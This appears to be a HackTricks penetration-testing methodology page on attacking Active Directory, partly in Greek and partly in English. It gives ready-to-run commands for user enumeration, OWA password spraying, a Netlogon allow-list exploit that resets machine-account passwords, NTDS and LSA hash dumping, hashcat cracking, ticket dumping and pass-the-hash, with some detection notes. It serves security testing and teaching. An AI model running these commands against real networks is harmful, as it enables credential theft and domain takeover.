# Μεθοδολογία Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Βασική επισκόπηση

Το **Active Directory** λειτουργεί ως θεμελιώδης τεχνολογία, επιτρέποντας στους **network administrators** να δημιουργούν και να διαχειρίζονται αποτελεσματικά **domains**, **users** και **objects** μέσα σε ένα δίκτυο. Είναι σχεδιασμένο να κλιμακώνεται, διευκολύνοντας την οργάνωση ενός μεγάλου αριθμού χρηστών σε διαχειρίσιμα **groups** και **subgroups**, ενώ ελέγχει τα **access rights** σε διάφορα επίπεδα.

Η δομή του **Active Directory** αποτελείται από τρία βασικά επίπεδα: **domains**, **trees** και **forests**. Ένα **domain** περιλαμβάνει μια συλλογή από objects, όπως **users** ή **devices**, που μοιράζονται μια κοινή βάση δεδομένων. Τα **trees** είναι ομάδες από αυτά τα domains που συνδέονται μέσω μιας κοινής δομής, και ένα **forest** αντιπροσωπεύει τη συλλογή πολλών trees, διασυνδεδεμένων μέσω **trust relationships**, σχηματίζοντας το ανώτατο επίπεδο της οργανωτικής δομής. Συγκεκριμένα **access** και **communication rights** μπορούν να οριστούν σε καθένα από αυτά τα επίπεδα.

Βασικές έννοιες στο **Active Directory** περιλαμβάνουν:

1. **Directory** – Περιέχει όλες τις πληροφορίες που αφορούν τα Active Directory objects.
2. **Object** – Δηλώνει οντότητες μέσα στο directory, συμπεριλαμβανομένων **users**, **groups** ή **shared folders**.
3. **Domain** – Λειτουργεί ως container για directory objects, με τη δυνατότητα πολλαπλά domains να συνυπάρχουν μέσα σε ένα **forest**, διατηρώντας το καθένα τη δική του συλλογή objects.
4. **Tree** – Μια ομαδοποίηση domains που μοιράζονται ένα κοινό root domain.
5. **Forest** – Η κορυφή της οργανωτικής δομής στο Active Directory, αποτελούμενο από αρκετά trees με **trust relationships** μεταξύ τους.

Το **Active Directory Domain Services (AD DS)** περιλαμβάνει ένα εύρος υπηρεσιών κρίσιμων για την κεντρική διαχείριση και επικοινωνία μέσα σε ένα δίκτυο. Αυτές οι υπηρεσίες αποτελούνται από:

1. **Domain Services** – Κεντροποιεί την αποθήκευση δεδομένων και διαχειρίζεται τις αλληλεπιδράσεις μεταξύ **users** και **domains**, συμπεριλαμβανομένων των λειτουργιών **authentication** και **search**.
2. **Certificate Services** – Επιβλέπει τη δημιουργία, διανομή και διαχείριση ασφαλών **digital certificates**.
3. **Lightweight Directory Services** – Υποστηρίζει directory-enabled applications μέσω του **LDAP protocol**.
4. **Directory Federation Services** – Παρέχει δυνατότητες **single-sign-on** για την αυθεντικοποίηση χρηστών σε πολλαπλές web applications σε μία μόνο συνεδρία.
5. **Rights Management** – Βοηθά στην προστασία υλικού πνευματικών δικαιωμάτων ρυθμίζοντας τη μη εξουσιοδοτημένη διανομή και χρήση του.
6. **DNS Service** – Καθοριστικής σημασίας για την επίλυση των **domain names**.

Για πιο αναλυτική εξήγηση δες: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Για να μάθεις πώς να **attack an AD** χρειάζεται να **understand** πολύ καλά τη διαδικασία **Kerberos authentication**.\
[**Διάβασε αυτή τη σελίδα αν ακόμα δεν ξέρεις πώς λειτουργεί.**](kerberos-authentication.md)

## Cheat Sheet

Μπορείς να δεις πολλά στο [https://wadcoms.github.io/](https://wadcoms.github.io) για μια γρήγορη εικόνα των commands που μπορείς να τρέξεις για να enumerate/exploit an AD.

> [!WARNING]
> Η επικοινωνία Kerberos **απαιτεί ένα πλήρως qualified name (FQDN)** για την εκτέλεση ενεργειών. Αν προσπαθήσεις να αποκτήσεις πρόσβαση σε ένα machine μέσω της IP address, **θα χρησιμοποιήσει NTLM και όχι kerberos**.

## Recon Active Directory (No creds/sessions)

Αν έχεις απλώς πρόσβαση σε ένα AD environment αλλά δεν έχεις κανένα credentials/sessions, μπορείς:

- **Pentest the network:**
- Σάρωσε το δίκτυο, βρες machines και open ports και προσπάθησε να **exploit vulnerabilities** ή να **extract credentials** από αυτά (για παράδειγμα, οι printers θα μπορούσαν να είναι πολύ ενδιαφέροντες στόχοι](ad-information-in-printers.md).
- Η απαρίθμηση DNS μπορεί να δώσει πληροφορίες για βασικούς servers στο domain όπως web, printers, shares, vpn, media, κ.λπ.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Δες τη γενική [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) για περισσότερες πληροφορίες σχετικά με το πώς να το κάνεις αυτό.
- **Έλεγξε για null και Guest access σε smb services** (αυτό δεν θα δουλέψει σε σύγχρονες εκδόσεις Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Ένας πιο αναλυτικός οδηγός για το πώς να κάνεις enumerate a SMB server μπορεί να βρεθεί εδώ:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Ένας πιο αναλυτικός οδηγός για το πώς να κάνεις enumerate LDAP μπορεί να βρεθεί εδώ (δώσε **ιδιαίτερη προσοχή στο anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Συγκέντρωσε credentials [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Πρόσβαση σε host μέσω [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Συγκέντρωσε credentials **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Εξήγαγε usernames/names από εσωτερικά documents, social media, services (κυρίως web) μέσα στα domain environments και επίσης από τα publicly available.
- Αν βρεις τα πλήρη names των εργαζομένων της εταιρείας, μπορείς να δοκιμάσεις διαφορετικά AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Οι πιο συνηθισμένες συμβάσεις είναι: _NameSurname_, _Name.Surname_, _NamSur_ (3 letters of each), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Δες τις σελίδες [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) και [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Όταν ζητείται ένα **invalid username**, ο server θα απαντήσει με τον **Kerberos error** κωδικό _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, επιτρέποντάς μας να διαπιστώσουμε ότι το username ήταν invalid. Τα **valid usernames** θα προκαλέσουν είτε το **TGT in a AS-REP** response είτε το error _KRB5KDC_ERR_PREAUTH_REQUIRED_, υποδεικνύοντας ότι ο χρήστης πρέπει να εκτελέσει pre-authentication.
- **No Authentication against MS-NRPC**: Χρήση auth-level = 1 (No authentication) έναντι της διεπαφής MS-NRPC (Netlogon) σε domain controllers. Η μέθοδος καλεί τη συνάρτηση `DsrGetDcNameEx2` αφού γίνει binding στη διεπαφή MS-NRPC για να ελέγξει αν ο χρήστης ή ο υπολογιστής υπάρχει χωρίς κανένα credentials. Το εργαλείο [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) υλοποιεί αυτόν τον τύπο enumeration. Η έρευνα μπορεί να βρεθεί [εδώ](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Αν βρήκες έναν από αυτούς τους servers στο network, μπορείς επίσης να κάνεις **user enumeration εναντίον του**. Για παράδειγμα, θα μπορούσες να χρησιμοποιήσεις το tool [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Μπορείτε να βρείτε λίστες με usernames σε [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  και σε αυτό ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Ωστόσο, θα πρέπει να έχετε το **name of the people working on the company** από το βήμα recon που θα έπρεπε να έχετε εκτελέσει πριν από αυτό. Με το όνομα και το επώνυμο θα μπορούσατε να χρησιμοποιήσετε το script [**namemash.py**](https://gist.github.com/superkojiman/11076951) για να δημιουργήσετε πιθανά έγκυρα usernames.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Ακόμα και μετά την επιδιόρθωση του **Zerologon** στο DC, οι explicit allow-listed accounts μπορούν να παραμείνουν εκτεθειμένοι σε **legacy/vulnerable Netlogon secure-channel behavior**. Η επικίνδυνη ρύθμιση είναι η GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ή η αντίστοιχη τιμή registry **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Αυτή η τιμή είναι ένα **SDDL security descriptor** (δείτε [Security Descriptors](security-descriptors.md)). Οποιοσδήποτε account ή group στον οποίο έχει δοθεί το σχετικό ACE στο DACL μπορεί να αποτελέσει στόχο. Για παράδειγμα, το `O:BAG:BAD:(A;;RC;;;WD)` ουσιαστικά allow-lists το **Everyone**.

Πρακτικό operator workflow:

1. **Identify allow-listed principals** ελέγχοντας τόσο το **SYSVOL/GPO** όσο και το **live DC registry**.
2. **Resolve SIDs** που βρέθηκαν στο SDDL σε πραγματικούς AD users/computers και δώστε προτεραιότητα σε **DC machine accounts**, **trust accounts**, και άλλα privileged machines.
3. Επαναλαμβανόμενη προσπάθεια για **MS-NRPC / Netlogon authentication** ως το allow-listed account.
4. Μετά από επιτυχημένο guess, abuse **Netlogon password-setting** για να επαναφέρετε το password του target account (το public PoC το θέτει σε κενή συμβολοσειρά).

Quick triage / lab examples from the public artifact:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Σημειώσεις:

- Το **scanner** είναι χρήσιμο επειδή το effective allow-list μπορεί να υπάρχει στο **SYSVOL**, στο **registry**, ή και στα δύο.
- Το exploit path από μόνο του είναι σημαντικό επειδή **δεν απαιτεί Domain Admin privileges** αφού έχει εντοπιστεί ένας vulnerable account.
- Η παραβίαση ενός **Domain Controller machine account** όπως το `DC$` είναι ιδιαίτερα επικίνδυνη επειδή το resetting αυτού του password μπορεί να ενεργοποιήσει άμεσα ευρύτερα **AD takeover** paths.
- Η εφικτότητα του **Brute-force** εξαρτάται από το mode: το public artifact περιγράφει μια meet-in-the-middle approach, ένα **24-bit** brute force όταν υπάρχει διαθέσιμο άλλο computer account, και πιο αργές παραλλαγές **32-bit**.

Σημειώσεις ανίχνευσης / hardening:

- Κάντε audit την allow-list policy και αφαιρέστε τα πάντα εκτός από προσωρινές, ρητά απαιτούμενες compatibility exceptions.
- Παρακολουθήστε τα DC **System** events **5827/5828/5829/5830/5831** για να εντοπίσετε vulnerable Netlogon connections που απορρίπτονται, εντοπίζονται, ή επιτρέπονται ρητά από policy.
- Αντιμετωπίστε τους accounts στο `VulnerableChannelAllowList` ως **high-risk** μέχρι να αφαιρεθεί η legacy dependency.

### Γνωρίζοντας ένα ή περισσότερα usernames

Οκ, άρα ξέρεις ήδη ότι έχεις ένα valid username αλλά κανένα password... Τότε δοκίμασε:

- [**ASREPRoast**](asreproast.md): Αν ένας user **δεν έχει** το attribute _DONT_REQ_PREAUTH_ μπορείς να **request a AS_REP message** για αυτόν τον user, το οποίο θα περιέχει κάποια δεδομένα encrypted από μια derivation του password του user.
- [**Password Spraying**](password-spraying.md): Ας δοκιμάσουμε τα πιο **common passwords** με κάθε έναν από τους discovered users, ίσως κάποιος user να χρησιμοποιεί κακό password (έχε υπόψη το password policy!).
- Σημείωσε ότι μπορείς επίσης να κάνεις **spray OWA servers** για να προσπαθήσεις να αποκτήσεις πρόσβαση στους users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Ίσως μπορέσεις να **obtain** κάποια challenge **hashes** για να crack **poisoning** κάποια protocols του **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Αν έχεις καταφέρει να enumerate το active directory θα έχεις **more emails and a better understanding of the network**. Ίσως μπορέσεις να αναγκάσεις NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  για να αποκτήσεις πρόσβαση στο AD env.

### NetExec workspace-driven recon & relay posture checks

- Χρησιμοποίησε **`nxcdb` workspaces** για να διατηρείς το AD recon state ανά engagement: το `workspace create <name>` δημιουργεί per-protocol SQLite DBs κάτω από `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Άλλαξε views με `proto smb|mssql|winrm` και λίσταρε τα gathered secrets με `creds`. Καθάρισε χειροκίνητα τα sensitive data όταν τελειώσεις: `rm -rf ~/.nxc/workspaces/<name>`.
- Το γρήγορο subnet discovery με **`netexec smb <cidr>`** εμφανίζει **domain**, **OS build**, **SMB signing requirements**, και **Null Auth**. Τα members που δείχνουν `(signing:False)` είναι **relay-prone**, ενώ τα DCs συχνά απαιτούν signing.
- Γεννήστε **hostnames in /etc/hosts** κατευθείαν από το NetExec output για να διευκολύνετε το targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Όταν το **SMB relay to the DC είναι blocked** από signing, εξακολουθήστε να ελέγχετε τη στάση του **LDAP**: `netexec ldap <dc>` επισημαίνει `(signing:None)` / weak channel binding. Ένα DC με υποχρεωτικό SMB signing αλλά απενεργοποιημένο LDAP signing παραμένει βιώσιμος στόχος **relay-to-LDAP** για abuses όπως **SPN-less RBCD**.

### Client-side printer credential leaks → bulk domain credential validation

- Τα Printer/web UIs μερικές φορές **embed masked admin passwords in HTML**. Η προβολή source/devtools μπορεί να αποκαλύψει cleartext (π.χ., `<input value="<password>">`), επιτρέποντας Basic-auth πρόσβαση σε scan/print repositories.
- Τα retrieved print jobs μπορεί να περιέχουν **plaintext onboarding docs** με per-user passwords. Κρατήστε τα ζεύγη ευθυγραμμισμένα όταν κάνετε testing:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Αν έχετε καταφέρει να enumerate το active directory θα έχετε **περισσότερα emails και καλύτερη κατανόηση του δικτύου**. Μπορεί να μπορέσετε να αναγκάσετε NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Τώρα που έχετε κάποια βασικά credentials, θα πρέπει να ελέγξετε αν μπορείτε να **βρείτε** οποιαδήποτε **ενδιαφέροντα files που είναι shared μέσα στο AD**. Θα μπορούσατε να το κάνετε χειροκίνητα, αλλά είναι μια πολύ βαρετή, επαναλαμβανόμενη εργασία (και ακόμη περισσότερο αν βρείτε εκατοντάδες docs που πρέπει να ελέγξετε).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Αν μπορείτε να **αποκτήσετε access σε άλλα PCs ή shares** θα μπορούσατε να **τοποθετήσετε files** (όπως ένα SCF file) που, αν somehow accessed, θα t**rigger an NTLM authentication against you** ώστε να μπορέσετε να **steal** το **NTLM challenge** και να το crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Αυτή η vulnerability επέτρεπε σε οποιονδήποτε authenticated user να **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Για τις ακόλουθες techniques, ένας απλός domain user δεν αρκεί, χρειάζεστε κάποια ειδικά privileges/credentials για να εκτελέσετε αυτές τις attacks.**

### Hash extraction

Ελπίζουμε να έχετε καταφέρει να **compromise κάποιο local admin** account χρησιμοποιώντας [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Έπειτα, είναι ώρα να dump όλα τα hashes στη μνήμη και τοπικά.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Μόλις έχετε το hash ενός user**, μπορείτε να το χρησιμοποιήσετε για να **impersonate** αυτόν.\
Χρειάζεται να χρησιμοποιήσετε κάποιο **tool** που θα **perform** το **NTLM authentication using** αυτό το **hash**, **ή** μπορείτε να δημιουργήσετε ένα νέο **sessionlogon** και να **inject** αυτό το **hash** μέσα στο **LSASS**, ώστε όταν γίνει οποιοδήποτε **NTLM authentication**, να χρησιμοποιηθεί εκείνο το **hash.** Η τελευταία επιλογή είναι αυτό που κάνει το mimikatz.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Αυτή η attack στοχεύει στο να **χρησιμοποιήσει το user NTLM hash για να ζητήσει Kerberos tickets**, ως εναλλακτική του συνηθισμένου Pass The Hash μέσω του NTLM protocol. Επομένως, αυτό μπορεί να είναι ιδιαίτερα **χρήσιμο σε networks όπου το NTLM protocol είναι disabled** και μόνο το **Kerberos is allowed** ως authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Στη μέθοδο attack **Pass The Ticket (PTT)**, οι attackers **steal a user's authentication ticket** αντί για το password ή τα hash values του. Αυτό το stolen ticket χρησιμοποιείται στη συνέχεια για να **impersonate the user**, αποκτώντας unauthorized access σε resources και services μέσα σε ένα network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Αν έχετε το **hash** ή το **password** ενός **local administrator** θα πρέπει να προσπαθήσετε να κάνετε **login locally** σε άλλα **PCs** με αυτό.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Σημείωσε ότι αυτό είναι αρκετά **noisy** και το **LAPS** θα το **mitigate**.

### MSSQL Abuse & Trusted Links

